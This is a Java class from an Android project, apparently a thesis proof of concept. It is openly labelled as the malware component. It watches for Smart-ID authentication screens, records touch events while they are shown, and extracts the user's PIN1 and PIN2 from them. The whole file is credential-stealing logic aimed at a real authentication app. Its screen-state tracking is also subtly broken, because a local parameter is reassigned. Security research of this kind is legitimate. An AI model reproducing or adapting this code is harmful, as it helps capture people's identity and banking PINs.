package com.example.thesis;

import android.util.Log;

import com.example.thesis.Events.Event;
import com.example.thesis.Events.EventReader;

import java.util.LinkedList;
import java.util.Queue;

/**
 * This is the malware part of the app.
 */
public class Malware implements Runnable {
    // TODO: dictionary for buttons, instead of list.

    final private Converter converter;      // TODO: if alternative works, then remove.

    final private EventReader eventReader;
    final private SmartIDCheck smartIDCheck;

    private boolean doStop = false;
    private boolean eventReaderRunning = false;

    private Queue<Integer> PIN1;
    private Queue<Integer> PIN2;

    public Malware(Converter converter) {
        this.converter = converter;
        this.smartIDCheck = new SmartIDCheck();
        this.eventReader = new EventReader();

        this.PIN1 = new LinkedList<>();
        this.PIN2 = new LinkedList<>();
    }


    public synchronized void doStop() {
        this.doStop = true;
        this.eventReader.doStop();
        this.smartIDCheck.doStop();
        Log.i("Malware", "Stopped malware!");
    }


    private synchronized boolean keepRunning() {
        return !this.doStop;
    }


    @Override
    public void run() {
        Log.i("Malware", "Started malware!");

        DisplayedScreen previousScreen = DisplayedScreen.OTHER; // TODO

        while (keepRunning()) {
            DisplayedScreen currentScreen = smartIDCheck.getCurrentScreen();

            if (DisplayedScreen.OTHER != currentScreen) {
                if (!eventReaderRunning) {
                    startListeningEvents();
                }
                malwareCode(currentScreen, previousScreen);
            } else if (eventReaderRunning) {
                stopListeningEvents();
            }

            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                Log.i("Malware", "Run loop interrupted!");
            }
        }
    }


    private void malwareCode(DisplayedScreen currentScreen, DisplayedScreen previousScreen) {
        if (currentScreen == DisplayedScreen.AUTH_PIN_1) {
            previousScreen = DisplayedScreen.AUTH_PIN_1;
        } else if (currentScreen == DisplayedScreen.AUTH_PIN_2) {
            previousScreen = DisplayedScreen.AUTH_PIN_2;
        } else if (currentScreen == DisplayedScreen.AUTH_SUCCESS) {
            if (previousScreen == DisplayedScreen.AUTH_PIN_1) {
                PIN1 = getPIN();
            } else if (previousScreen == DisplayedScreen.AUTH_PIN_2) {
                PIN2 = getPIN();
            }
        } else if (currentScreen == DisplayedScreen.AUTH_FAILED) {
            getPIN();
        }
    }


    private void startListeningEvents() {
        eventReader.doStart();
        Thread eventReaderThread = new Thread(eventReader);
        eventReaderThread.start();
        eventReaderRunning = true;
    }

    private void stopListeningEvents() {
        eventReader.doStop();
        eventReaderRunning = false;
    }


    /**
     * Empties touchevents also.
     * @return
     */
    private Queue<Integer> getPIN() {
        Queue<Event> touchEvents = eventReader.getTouchEvents();
        return smartIDCheck.extractPIN(touchEvents);
    }



}



